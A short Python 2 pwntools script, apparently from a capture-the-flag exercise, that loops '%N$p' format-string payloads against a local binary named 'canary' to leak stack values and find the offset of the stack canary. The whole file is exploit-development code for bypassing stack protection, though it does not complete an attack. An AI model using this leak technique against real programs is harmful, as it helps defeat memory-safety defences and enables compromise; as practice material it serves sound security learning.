#!/usr/bin/python2
from pwn import *

def offset_finder():
    # By using this function we can find out that our input is stored at offset eleven of the stack

    for x in range (1, 100):
        p = process("./canary")
        
        print "Offset number {}".format(x)

        payload = ""
        payload += "%{}$p".format(x)

        p.sendline(payload)
        
        p.recvuntil("you, ")
        
        stack_value = p.recvline()[:-2]
        print "Stack value: {}".format(stack_value)
        if stack_value.find("00") != -1:
             print "Offset found!"
             print "Stack value: {}".format(stack_value)
             break
        else:
             print "Stack value: {}".format(stack_value)
            
        p.close()
if __name__ == "__main__":
    offset_finder()
